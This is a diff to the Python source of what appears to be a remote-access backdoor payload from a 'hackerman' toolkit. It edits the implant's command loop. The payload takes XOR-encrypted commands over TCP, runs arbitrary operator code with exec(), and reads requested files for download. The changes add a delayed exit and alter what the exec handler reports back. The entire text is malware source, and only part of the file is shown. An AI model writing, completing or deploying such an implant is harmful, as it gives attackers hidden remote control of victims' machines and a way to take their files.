@@ -1,7 +1,11 @@
 from hackerman.transport import tcp
 from hackerman.crypto import xor
 from hackerman import utils
-import json, _thread
+import json, _thread, time
+
+def do_exit():
+	time.sleep(5)
+	exit(0)
 
 class Payload(object):
 	def __init__(self, addr, password):
@@ -17,7 +21,8 @@ class Payload(object):
 
 			res = self.handle(cmd)
 			if res == "exit":
-				break
+				_thread.start_new_thread(do_exit, ( ))
+				res = {'res':"quit"}
 
 			dat = json.dumps(res).encode()
 			enc = xor.encrypt(dat,self.pwd)
@@ -39,7 +44,7 @@ class Payload(object):
 			return cmd
 		elif cmd['type'] == "exec":
 			exec(cmd['cmd'])
-			cmd['res'] = utils.b64e(globals()[cmd['out']])
+			cmd['res'] = utils.b64e("exec'd".encode())
 			return cmd
 		elif cmd['type'] == "dl":
 			fd = open(cmd['fn'],"rb").read()
